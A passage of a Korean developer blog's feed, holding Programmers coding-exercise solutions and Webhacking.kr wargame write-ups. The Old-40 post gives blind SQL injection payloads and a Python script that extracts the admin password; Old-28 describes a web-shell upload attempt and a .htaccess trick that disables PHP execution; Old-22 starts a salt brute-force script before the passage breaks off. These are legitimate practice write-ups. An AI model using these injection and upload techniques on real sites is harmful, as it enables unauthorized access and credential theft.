class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule2</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">&#x27;-_.&#x27;</span>:</span><br><span class="line">            result += i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule3</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    check = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        <span class="keyword">if</span> check:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                check = <span class="literal">False</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            check = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        result += i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule4</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">id</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">id</span>[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = <span class="built_in">id</span>[<span class="number">1</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">id</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">id</span>[<span class="number">-1</span>] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = <span class="built_in">id</span>[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule6</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">id</span>) &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="built_in">id</span> = <span class="built_in">id</span>[:<span class="number">15</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">id</span>[<span class="number">-1</span>] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="built_in">id</span> = <span class="built_in">id</span>[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">new_id</span>):</span></span><br><span class="line">    new_id = new_id.lower()</span><br><span class="line">    new_id = rule2(new_id)</span><br><span class="line">    new_id = rule3(new_id)</span><br><span class="line">    new_id = rule4(new_id)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> new_id == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        new_id = <span class="string">&#x27;aaa&#x27;</span></span><br><span class="line">    </span><br><span class="line">    new_id = rule6(new_id)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(new_id) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            new_id += new_id[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(new_id) == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> new_id</span><br></pre></td></tr></table></figure><p>정규표현식을 사용하지 않고 풀이한 코드이다.</p><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">new_id</span>):</span></span><br><span class="line">    new_id = new_id.lower()</span><br><span class="line">    new_id = re.sub(<span class="string">&#x27;[^a-z0-9\-_.]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, new_id)</span><br><span class="line">    new_id = re.sub(<span class="string">&#x27;\.+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, new_id)</span><br><span class="line">    new_id = re.sub(<span class="string">&#x27;^[.]|[.]$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, new_id)</span><br><span class="line">    new_id = <span class="string">&#x27;a&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(new_id) == <span class="number">0</span> <span class="keyword">else</span> new_id[:<span class="number">15</span>]</span><br><span class="line">    new_id = re.sub(<span class="string">&#x27;^[.]|[.]$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, new_id)</span><br><span class="line">    new_id = new_id <span class="keyword">if</span> <span class="built_in">len</span>(new_id) &gt; <span class="number">2</span> <span class="keyword">else</span> new_id + <span class="string">&quot;&quot;</span>.join([new_id[<span class="number">-1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>-<span class="built_in">len</span>(new_id))])</span><br><span class="line">    <span class="keyword">return</span> new_id</span><br></pre></td></tr></table></figure><p>정규표현식을 사용하면 작은 양의 코드로 깔끔하게 풀이를 할 수 있으나, 속도면에서는 방법1이 더 빠르다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EC%8B%A0%EA%B7%9C-%EC%95%84%EC%9D%B4%EB%94%94-%EC%B6%94%EC%B2%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 내적</title>
      <link>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EB%82%B4%EC%A0%81/</link>
      <guid>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EB%82%B4%EC%A0%81/</guid>
      <pubDate>Mon, 07 Jun 2021 22:18:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;내적&quot;&gt;&lt;a href=&quot;#내적&quot; class=&quot;headerlink&quot; title=&quot;내적&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://192.168.219.100:4000/admin/#/posts/ckpnpogmj00nd10p88vqk27ao&quot;&gt;내적</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="내적"><a href="#내적" class="headerlink" title="내적"></a><a href="http://192.168.219.100:4000/admin/#/posts/ckpnpogmj00nd10p88vqk27ao">내적</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>길이가 같은 두 1차원 정수 배열 a, b가 매개변수로 주어집니다. a와 b의 내적을 return 하도록 solution 함수를 완성해주세요.</p><p>이때, a와 b의 내적은 a[0]*b[0] + a[1]*b[1] + … + a[n-1]*b[n-1] 입니다. (n은 a, b의 길이)</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>a, b의 길이는 1 이상 1,000 이하입니다.</li><li>a, b의 모든 수는 -1,000 이상 1,000 이하입니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    result += a[i] * b[i] </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">sum</span>([a[i] * b[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br></pre></td></tr></table></figure><h3 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">sum</span>([i * j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EB%82%B4%EC%A0%81/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 40 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-40-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-40-Write-Up/</guid>
      <pubDate>Mon, 07 Jun 2021 12:05:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-40"><a href="#Old-40" class="headerlink" title="Old - 40"></a>Old - 40</h2><p><img src="/images/pasted-649.png"><br>문제 페이지에 들어가니, 3개의 파라미터로 로그인을 하는 페이지가 나왔다.<br><br>Input의 Value가 지정되어 있어서 값들이 채워져 있다.</p><p><img src="/images/pasted-650.png"><br>디폴트 값을 확인해보니, type이 Password라서 안보였던 값이 볼 수 있었다.</p><p><img src="/images/pasted-651.png"><br>디폴트 값인 No = 1, Id = guest, Pw = guest로 로그인을 시도하니, Get 메소드로 파라미터가 전달되고  ‘Success - guest’가 출력된 후 로그인 페이지로 리다이렉트되었다.</p><p>나는 순서상 No이 가장 먼저 있어서 쿼리문에 들어가는 것도 No가 먼저 들어갈 거라는 추측으로 다양한 시도를 해봤다.<br><br>그 중 하나로 no의 값을 1말고 다른 숫자를 넣어봤지만, Failure이 출력되었다. 많은 숫자들 중에서 오직 0만 아무 출력도 되지 않고 그대로 리다이렉트를 하였다.</p><p>다른 숫자로 넣는 것은 틀린 것 같으니, SQLi를 시도해봤다.</p><p><img src="/images/pasted-652.png" alt="`?no=1&#39;&amp;id=guest&amp;pw=guest`"><br>Mysql의 Error 메서지는 출력되지 않았다.</p><p><img src="/images/pasted-653.png" alt="`?no=1 or 1=1#&amp;id=guest&amp;pw=guest`"><br><code>SELECT id FROM chall40 WHERE no=NO파라미터 and id=‘ID파라미터’ and pw=‘PW파라미터</code>로 이루어져 있다고 생각을 하여 시도를 하였다.<br><br><code>SELECT id FROM chall40 WHERE no=1 or 1=1#</code>으로 되면서 guest로 로그인이 될 것으로 생각했지만, 결과는 틀린 생각이였다.<br><br>그 이유를 생각했을 때 True가 되면 먼저 들어간 데이터 순으로 정렬되기 때문에 다른 값이 출력되어 로그인이 안된 것으로 생각이 든다.</p><p><img src="/images/pasted-654.png"><br><code>?no=1=1#&amp;id=guest&amp;pw=guest</code>또는 <code>?no=1#&amp;id=guest&amp;pw=guest</code><br>위 쿼리가 실패한 후 나는 “<code>no=1</code>만 넣어서 쿼리를 실행시키면 어떻게 될까?”라는 생각에 시도해보니, guest로 로그인이 되었다.</p><p><img src="/images/pasted-655.png"><br>적다보니, 생각이 났다.  <code>no=1 and 1=1</code>는 no의 값은 1이 된다는 것이다.<br><br>그래서 다시 시도했다.</p><p><img src="/images/pasted-656.png" alt="`?no=1 and 1=1#&amp;id=guest&amp;pw=guest`"><br>이상하게 access denied이 출력되었다.</p><p><img src="/images/pasted-657.png"><br>혹시 띄어쓰기에 대한 검사가 있는지 확인하기 위해 <code>no=1 </code>를 시도해봤다.<br><br>그 결과는 띄어쓰기에 대한 검사가 있었다.</p><p>이를 우회하기 위해 <code>&amp;&amp;</code>를 사용하여 띄어쓰기를 사용하지 않고 시도해봤다.</p><p><img src="/images/pasted-658.png" alt="`?no=1&amp;&amp;1=1#&amp;id=guest&amp;pw=guest`"><br>로그인에 성공하였다.</p><p><img src="/images/pasted-659.png" alt="`no=-1||id=‘admin’#&amp;id=guest&amp;pw=guest`"><br>나는 <code>no=-1||id=‘admin’#</code>으로 admin 계정 로그인을 시도하였다.<br><br>하지만 로그인에 실패하였다. 혹시 <code>&#39;</code>에 대한 검사가 있는지 확인해봤다.</p><p><img src="/images/pasted-660.png" alt="`?no=-1||id=0x61646D696E#&amp;id=guest&amp;pw=guest`"><br><code>&#39;</code>에 검사 때문에 로그인이 실패된 것이였다. 하지만 Admin 계정으로 로그인이 바로 되지 않고, 패스워드를 쳐야 로그인이 되도록 되어있었다.</p><p>그래서 패스워드를 구하기 위해 SUBSTR 함수가 사용 가능한지 확인을 해봤다.</p><p><img src="/images/pasted-661.png" alt="`?no=1&amp;&amp;SUBSTR(id,1,1)=0x67`"><br>SUBSTR 함수는 검사에 걸리지 않았다. 이를 이용하여 패스워드를 알아보도록 하겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwLength</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=aefsht2i59d26nohrnb3an9gev&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        res = requests.get(url + <span class="string">f&#x27;?no=-1%7C%7C%28id%3D0x61646D696E%26%26length%28pw%29%3D<span class="subst">&#123;i&#125;</span>%29%23&amp;id=guest&amp;pw=guest&#x27;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin password&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwPrint</span>(<span class="params">url:<span class="built_in">str</span>, length:<span class="built_in">int</span></span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=aefsht2i59d26nohrnb3an9gev&#x27;</span>&#125;</span><br><span class="line">    pw =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string.ascii_lowercase + string.digits + string.punctuation:</span><br><span class="line">            res = requests.get(url + <span class="string">f&#x27;?no=-1%7c%7c(id%3d0x61646D696E%26%26SUBSTR(pw%2c<span class="subst">&#123;idx&#125;</span>%2c1)%3d<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(s))&#125;</span>)%23&amp;id=guest&amp;pw=guest&#x27;</span>, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin password&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                pw += s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;idx&#125;</span>번째 완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">    print(<span class="string">&#x27;완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-29/&#x27;</span></span><br><span class="line">    length = pwLength(url)</span><br><span class="line">    pwPrint(url, length)</span><br></pre></td></tr></table></figure><p>자꾸 URL 인코딩 때문에 넘어가지 않아서 URL 인코딩을 하였다.<br><br>해당 SQL 쿼리는 <code>-1||(id=0x61646D696E&amp;&amp;length(pw)=&#123;i&#125;)#</code>와 <code>-1||(id=0x61646D696E&amp;&amp;SUBSTR(pw,&#123;idx&#125;,1)=&#123;s&#125;)#</code>이다.<br><br>이렇게 하면 확실하게 admin의 pw를 획득할 수 있다.</p><p><img src="/images/pasted-662.png"><br>admin의 패스워드를 획득하였다.</p><p><img src="/images/pasted-663.png"><br>Admin으로 로그인을 하니, flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-40-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 28 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/</guid>
      <pubDate>Mon, 07 Jun 2021 00:02:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-28"><a href="#Old-28" class="headerlink" title="Old - 28"></a>Old - 28</h2><p><img src="/images/pasted-643.png"><br>파일 업로드 페이지가 나왔다.<br><br>Flag가 안 나올 것을 알지만, flag.php 파일을 클릭하여 출력해봤다.</p><p><img src="/images/pasted-644.png"><br>새 하얗다… 아무것도 출력이 안됐다.<br><br>아마도 PHP 코드 안에 flag가 있는데 PHP가 실행되어서 아무것도 나오지 않는 듯 하다..</p><p>“그렇다면, 웹쉘을 업로드하면 웹쉘이 작동될까?”라는 생각을 하고 웹쉘을 업로드하였다.</p><p><img src="/images/pasted-645.png"><br><img src="/images/pasted-646.png"><br>PHP가 실행되지 않고, 읽기 모드로 브라우저에 출력되었다.<br><br>flag.php는 실행되면서, 내가 올린 파일은 실행도 안된다는 것에 한탄을 하면서 flag.php의 php 비활성화 방법을 찾아봤다.</p><p>1시간이 넘는 시간 동안 인터넷에 검색과 내가 알고있는 방법을 동원해도 통하지 않아서, 결국 다른 사람의 풀이 참고하였다.<br><br>다른 사람들은 .htaccess를 통해 간단하게 php 비활성화시켜 flag.php를 확인할 수 있었다.</p><blockquote><p><a href="https://httpd.apache.org/docs/current/ko/howto/htaccess.html">아파치 투토리얼: .htaccess 파일 - Apache HTTP Server Version 2.4</a><br>.htaccess 파일 : 아파치 설정파일이며, 디렉토리 별로 설정을 변경할 수 있는 분산 설정 파일이다.</p></blockquote><blockquote><p><a href="https://www.php.net/manual/en/apache.configuration.php">PHP Manual: Runtime Configuration</a><br>공식 PHP 메뉴얼을 살펴보면 .htaccess파일의 php_flag 설정을 통해 php.ini 구성 설정을 재정의할 수 있다고 나와 있다.</p></blockquote><p><img src="/images/pasted-647.png"><br><img src="/images/pasted-648.png"><br>php_flag engine off의 내용을 가진 .htaccess를 업로드하여, flag.php를 실행하지 않고 그대로 읽을 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/07/Webhacking-kr-Old-28-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 22 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/</guid>
      <pubDate>Sun, 06 Jun 2021 22:35:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-22"><a href="#Old-22" class="headerlink" title="Old - 22"></a>Old - 22</h2><p><img src="/images/pasted-624.png"><br>Admin으로 로그인하는게 이번 문제의 미션이다.</p><p><img src="/images/pasted-625.png"><br>혹시 guest 계정도 있을 것을 같아서 guest/guest로 로그인 시도하니, Login Fail이 출력되었다.</p><p><img src="/images/pasted-627.png"><br>admin/admin으로 로그인을 시도하니, 이번 역시 Login Fail이 출력되었다.</p><p><img src="/images/pasted-628.png"><br><img src="/images/pasted-629.png"><br>이번엔 SQLi를 시도하니, 패스워드가 틀렸다고 출력되었다.</p><p><img src="/images/pasted-630.png"><br>False를 삽입하면 어떻게 되는지 궁금하여, <code>admin&#39; and 1=0#</code>를 넣어서 시도하였다.<br><br>True의 값과 다른 출력을 볼 수 있었다. 이것을 이용하여 Blind SQLi를 시도할 수 있을 것 같다.</p><p><img src="/images/pasted-631.png"><br><img src="/images/pasted-632.png"><br>로그인이 성공하면 어떤 결과가 나오는지 궁금하여, Join 페이지에 들어가서 lrtk/lrtk으로 계정을 만들었다.</p><p><img src="/images/pasted-633.png"><br>로그인을 해보니, 패스워드의 해시값이 출력됐다.<br><br>해당 해시의 길이가 32 글자로, lrtk 계정의 패스워드가 MD5로 해시화를 한 것으로 판단된다.</p><p><img src="/images/pasted-634.png"><br>Lrtk 계정의 패스워드인 lrtk을 MD5로 해시화를 진행하니 문제 페이지에서 출력된 해시와 틀린 값을 볼 수 있었다.<br><br>아마 salt를 넣어준 것으로 생각하였다.</p><p>해당 MD5를 복호화하려고 복호화 사이트들을 들어가서 넣어보니, 모두 DB에 저장이 안된 값이라는 출력만 볼 수 있었다.</p><p><img src="/images/pasted-635.png"><br>그래서 나는 salt값을 구하기 위해 python으로 hash값을 구하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, itertools, hashlib, pprint</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;lrtk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saltFront</span>(<span class="params">salts</span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> salts:</span><br><span class="line">        salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(item)):</span><br><span class="line">            salt += item[idx]</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update((salt + text).encode())</span><br><span class="line">        md5Text = md5.hexdigest()</span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;md5Text&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;salt + text&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saltEnd</span>(<span class="params">salts</span>):</span></span><br><span 